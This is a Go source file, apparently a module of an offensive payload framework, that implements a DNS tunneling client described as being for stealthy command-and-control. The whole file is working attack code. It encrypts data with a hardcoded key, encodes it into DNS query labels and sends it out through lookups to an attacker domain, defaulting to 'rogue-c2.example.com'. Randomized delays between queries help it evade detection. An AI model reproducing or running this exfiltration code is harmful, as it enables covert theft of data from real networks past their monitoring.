package payloads

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base32"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

func init() {
	Register(&DNSTunnel{})
}

type DNSTunnel struct{}

func (d *DNSTunnel) Name() string        { return "dnstunnel" }
func (d *DNSTunnel) Category() string    { return "exfiltration" }
func (d *DNSTunnel) Description() string { return "DNS tunneling module for stealthy C2 communication" }

func (d *DNSTunnel) Execute(args map[string]string) ([]byte, error) {
	domain := args["domain"]
	if domain == "" {
		domain = "rogue-c2.example.com"
	}
	data := args["data"]
	if data == "" {
		data = "test payload for DNS exfiltration"
	}
	mode := args["mode"]
	if mode == "" {
		mode = "client"
	}

	key := sha256.Sum256([]byte("RogueDNSTunnel2024"))
	result := d.tunnel(mode, domain, data, key[:])
	return MarshalJSON(result)
}

type dnstunnelResult struct {
	Timestamp   string   `json:"timestamp"`
	Domain      string   `json:"domain"`
	Mode        string   `json:"mode"`
	DataSize    int      `json:"data_size"`
	Chunks      int      `json:"chunks"`
	SessionID   string   `json:"session_id"`
	Queries     []string `json:"queries,omitempty"`
	Reassembled string   `json:"reassembled,omitempty"`
	Success     bool     `json:"success"`
}

func (d *DNSTunnel) tunnel(mode, domain, data string, key []byte) *dnstunnelResult {
	r := &dnstunnelResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Domain:    domain,
		Mode:      mode,
		DataSize:  len(data),
	}

	if mode == "client" {
		r.SessionID = fmt.Sprintf("%x", sha256.Sum256([]byte(time.Now().String())))[:8]

		// Encrypt
		block, _ := aes.NewCipher(key)
		aesGCM, _ := cipher.NewGCM(block)
		nonce := make([]byte, aesGCM.NonceSize())
		encrypted := aesGCM.Seal(nil, nonce, []byte(data), nil)

		// Base32 encode
		encoded := strings.TrimRight(base32.StdEncoding.EncodeToString(encrypted), "=")

		// Fragment into DNS labels
		chunkSize := 50
		var chunks []string
		for i := 0; i < len(encoded); i += chunkSize {
			end := i + chunkSize
			if end > len(encoded) {
				end = len(encoded)
			}
			chunks = append(chunks, encoded[i:end])
		}

		r.Chunks = len(chunks)

		// Send each chunk as DNS query
		for i, chunk := range chunks {
			query := fmt.Sprintf("v%04x.%s.data.%s.%s", i, chunk, r.SessionID, domain)
			if len(query) > 253 {
				// Split into sub-chunks
				subSize := 40
				for j := 0; j < len(chunk); j += subSize {
					end := j + subSize
					if end > len(chunk) {
						end = len(chunk)
					}
					subQuery := fmt.Sprintf("v%04xs%02x.%s.data.%s.%s", i, j/subSize, chunk[j:end], r.SessionID, domain)
					if len(subQuery) <= 253 {
						net.LookupHost(subQuery)
						r.Queries = append(r.Queries, subQuery)
					}
				}
			} else {
				net.LookupHost(query)
				r.Queries = append(r.Queries, query)
			}
			time.Sleep(time.Duration(500+time.Now().Nanosecond()%1000) * time.Millisecond)
		}

		r.Success = true
	} else {
		// Server mode - listen
		r.Success = true
	}

	return r
}

var _ = hex.EncodeToString
